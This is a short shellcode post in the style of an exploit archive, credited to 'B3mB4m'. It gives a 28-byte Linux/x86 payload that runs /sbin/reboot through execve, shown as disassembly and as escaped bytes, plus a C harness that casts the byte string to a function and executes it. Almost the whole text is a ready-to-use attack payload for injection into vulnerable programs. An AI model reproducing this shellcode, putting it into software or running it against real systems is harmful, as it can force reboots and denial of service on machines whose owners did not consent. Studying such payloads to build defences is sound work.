Linux/x86  Reboot - 28Bytes


#Greetz : Bomberman(Leader)
#Author : B3mB4m
#Tested ON : Ubuntu 14.04


08048060 <.text>:
 8048060:	31 c0                	xor    %eax,%eax
 8048062:	50                   	push   %eax
 8048063:	68 62 6f 6f 74       	push   $0x746f6f62
 8048068:	68 6e 2f 72 65       	push   $0x65722f6e
 804806d:	68 2f 73 62 69       	push   $0x6962732f
 8048072:	89 e3                	mov    %esp,%ebx
 8048074:	50                   	push   %eax
 8048075:	53                   	push   %ebx
 8048076:	89 e1                	mov    %esp,%ecx
 8048078:	b0 0b                	mov    $0xb,%al
 804807a:	cd 80                	int    $0x80



#include <stdio.h>
#include <string.h>

char *shellcode = "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65"
"\x68\x2f\x73\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";


int main(void){
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}